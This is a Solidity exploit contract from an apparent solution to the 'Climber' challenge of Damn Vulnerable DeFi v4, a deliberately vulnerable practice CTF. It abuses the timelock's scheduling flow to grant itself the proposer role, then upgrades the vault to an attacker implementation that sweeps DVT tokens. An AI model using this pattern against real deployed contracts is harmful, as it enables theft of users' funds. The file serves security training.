// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberTimelock} from "../ClimberTimelock.sol";
import {ClimberVaultAttackImplementation} from "./ClimberVaultAttackImplementation.sol";

contract ClimberTimelockAttacker {
    function attackOperationSchedule(
        address payable timelock,
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements
    ) public {
        bytes[] memory newDataElements = new bytes[](3);

        newDataElements[0] = dataElements[0];
        newDataElements[1] = dataElements[1];
        newDataElements[2] = abi.encodeWithSignature(
            "attackOperationSchedule(address,address[],uint256[],bytes[])", timelock, targets, values, dataElements
        );

        ClimberTimelock(timelock).schedule(targets, values, newDataElements, bytes32("grant proposer role"));
    }

    function attackClimberVault(
        address payable timelockAdminContract,
        address attackImplementation,
        address climberVault,
        address recovery,
        address token
    ) public {
        address[] memory targets = new address[](1);
        targets[0] = climberVault;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            attackImplementation,
            abi.encodeWithSignature("sweepDvtTokens(address,address)", recovery, token)
        );

        ClimberTimelock(timelockAdminContract).schedule(targets, values, dataElements, bytes32("sweep tokens"));
        ClimberTimelock(timelockAdminContract).execute(targets, values, dataElements, bytes32("sweep tokens"));
    }
}
